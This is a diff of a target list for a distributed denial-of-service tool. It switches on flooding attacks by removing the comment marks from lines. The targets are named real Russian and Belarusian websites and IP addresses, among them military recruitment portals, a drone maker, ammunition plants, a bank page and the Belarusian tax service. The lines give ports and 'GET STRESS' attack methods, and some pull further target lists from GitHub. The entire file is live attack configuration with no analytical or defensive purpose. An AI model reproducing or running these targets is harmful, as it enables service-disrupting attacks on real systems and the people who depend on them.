@@ -48,17 +48,19 @@
 
 #https://195.189.222.59:443 https://194.49.120.61:443 http://195.189.222.42:80 tcp://195.189.222.62:25 https://194.49.120.60:443 https://194.49.120.61:443 tcp://195.189.222.62:465 tcp://194.49.120.61:443 tcp://195.189.222.58:80 tcp://195.189.222.58:465 tcp://178.248.234.88:80 --http-methods GET STRESS
 
-#http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
+http://contract-army.ru https://www.voenkoma.net https://gogov.ru/mil http://5.101.152.200:80 http://45.130.41.19:80 http://45.130.41.19:443 https://45.130.41.19:443 http://95.213.199.232:443 https://95.213.199.232:443 http://95.213.199.232:1500 https://95.213.199.232:1500 tcp://5.101.152.200:80 tcp://45.130.41.19:80 tcp://45.130.41.19:443 tcp://95.213.199.232:80 tcp://95.213.199.232:443 tcp://95.213.199.232:1500 --http-methods GET STRESS
 
-#https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET STRESS
+https://www.cryptopro.ru/order/OrderForm.aspx?catid=c26ac260-7cfc-e811-870f-0025900a9ce7~ http://178.238.112.83:80 http://178.238.112.83:443 https://178.238.112.83:443 tcp://178.238.112.83:80 tcp://178.238.112.83:443 --http-methods GET STRESS
 
-#https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
+https://zala-aero.com/about/ https://zala-aero.com/production/ http://37.143.13.3:80 http://37.143.13.3:443 https://37.143.13.3:443 http://37.143.13.3:1500 https://37.143.13.3:1500 tcp://37.143.13.3:21 tcp://37.143.13.3:22 tcp://37.143.13.3:25 tcp://37.143.13.3:80 tcp://37.143.13.3:110 tcp://37.143.13.3:123 tcp://37.143.13.3:143 tcp://37.143.13.3:443 tcp://37.143.13.3:993 tcp://37.143.13.3:995 tcp://37.143.13.3:1500 --http-methods GET STRESS
 
-#https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.13:443 https://87.236.16.13:443 tcp://87.236.16.13:21 tcp://87.236.16.13:22 tcp://87.236.16.13:80 tcp://87.236.16.13:443 --http-methods GET STRESS
+https://bank-online-kabinet.ru/wp-json/ http://87.236.16.13:80 http://87.236.16.13:443 https://87.236.16.13:443 tcp://87.236.16.13:21 tcp://87.236.16.13:22 tcp://87.236.16.13:80 tcp://87.236.16.13:443 --http-methods GET STRESS
 
-#https://moe-online.ru/news --http-methods GET STRESS
+https://moe-online.ru/news --http-methods GET STRESS
 
-#http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
+http://new.kspz.ru/ http://ulnammo.ru/vp/ http://www.barnaulpatron.ru/ru/ http://xn----7sbb5bnffjmff.xn--p1ai/en/index.php https://lztamarshal.ru/catalog/ http://www.tulammo.ru/en/ http://90.156.201.18:80 http://90.156.201.45:80 http://90.156.201.107:80 http://90.156.201.117:80 http://95.104.194.195:80 http://77.222.61.193:80 http://91.189.114.18:80 http://31.31.198.239:80 https://31.31.198.239:443 http://91.189.114.18:80 --http-methods GET STRESS
+
+http://nalog.gov.by 195.50.4.54:80 195.50.4.54:443 tcp://195.50.4.54:80 tcp://195.50.4.54:443 --http-methods STRESS GET
 
 #http://roszdravnadzor.gov.ru http://95.173.145.58:80 http://95.173.145.58:443 https://95.173.145.58:443 http://95.173.145.58:8080 tcp://95.173.145.58:80 tcp://95.173.145.58:443 tcp://95.173.145.58:8080 --http-methods GET STRESS
 
@@ -68,12 +70,12 @@
 
 #-c https://raw.githubusercontent.com/OleksandrBlack/ddoswarlist/main/layer7.lst --http-methods BYPASS STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp1 --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/attacker/main/runner_targets_ocsp2 --http-methods GET STRESS
 
 #-c https://raw.githubusercontent.com/alexnest-ua/targets/main/api_auto_mila --http-methods GET STRESS
 
-#-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
+-c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/biggeek_re-store --http-methods GET STRESS
 
-#https://www.a-3.ru/pay_gaz --http-methods GET STRESS
+https://www.a-3.ru/pay_gaz --http-methods GET STRESS
